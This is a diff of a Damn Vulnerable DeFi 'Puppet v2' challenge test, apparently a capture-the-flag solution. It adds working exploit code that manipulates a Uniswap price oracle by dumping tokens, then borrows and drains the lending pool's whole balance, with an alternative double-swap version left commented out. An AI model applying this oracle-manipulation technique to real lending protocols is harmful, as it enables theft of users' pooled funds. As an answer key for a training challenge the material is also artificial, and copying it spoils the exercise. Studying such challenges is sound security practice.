@@ -52,7 +52,7 @@ describe('[Challenge] Puppet v2', function () {
             0,                                                          // amountTokenMin
             0,                                                          // amountETHMin
             deployer.address,                                           // to
-            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // DEADLINE
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
         uniswapExchange = await UniswapPairFactory.attach(
@@ -83,6 +83,64 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // deposit required to borrow lending pool tokens at the beginning
+        let DEPOSIT_REQUIRED_BEFORE_SWAP = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); // 300.000.000.000.000.000.000.000
+        console.log("DEPOSIT REQUIRED BEFORE SWAP: ", DEPOSIT_REQUIRED_BEFORE_SWAP);
+        const DEADLINE = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        
+        
+        /* SOLUTION 1: DOUBLE SWAP AND BORROW  */
+        /* let playerBalance = await ethers.provider.getBalance(player.address);
+        // swap player ETH for DVT
+        await uniswapRouter.connect(player).swapExactETHForTokens(
+            0,
+            [weth.address, token.address],
+            player.address,
+            DEADLINE,
+            { value: playerBalance.sub(ethers.utils.parseEther('0.1')) }
+        );
+
+        // swap all DVTs for WETH
+        let playerTokenBalance = await token.balanceOf(player.address)
+        await token.connect(player).approve(uniswapRouter.address, playerTokenBalance)
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            playerTokenBalance,
+            0,
+            [token.address, weth.address],
+            player.address,
+            DEADLINE
+        );
+        // deposit required to borrow lending pool tokens after swapping DVTs for ETH
+        let DEPOSIT_REQUIRED_AFTER_SWAP = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); // 29.496.494.833.197.321.980
+        console.log("DEPOSIT REQUIRED AFTER SWAP: ", DEPOSIT_REQUIRED_AFTER_SWAP); */
+        /* END SOLUTION 1 */
+
+        
+        /* SOLUTION 2: SWAP, WRAP AND BORROW  */
+        const PATH = [token.address, weth.address];
+        
+        // swap DVTs for ETH in order to lower the price
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        let tx = await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            PATH,
+            player.address,
+            DEADLINE
+        );
+        await tx.wait();
+
+        // deposit required to borrow lending pool tokens after swapping DVTs for ETH
+        const DEPOSIT_REQUIRED_AFTER_SWAP = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); // 29.496.494.833.197.321.980
+        console.log("DEPOSIT REQUIRED AFTER SWAP: ", DEPOSIT_REQUIRED_AFTER_SWAP);
+        // wrap required amount of ETH
+        await weth.connect(player).deposit({ value: DEPOSIT_REQUIRED_AFTER_SWAP });
+        /* END SOLUTION 1 */
+
+
+        // call lendingPool borrow function to drain the funds
+        await weth.connect(player).approve(lendingPool.address, DEPOSIT_REQUIRED_AFTER_SWAP);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
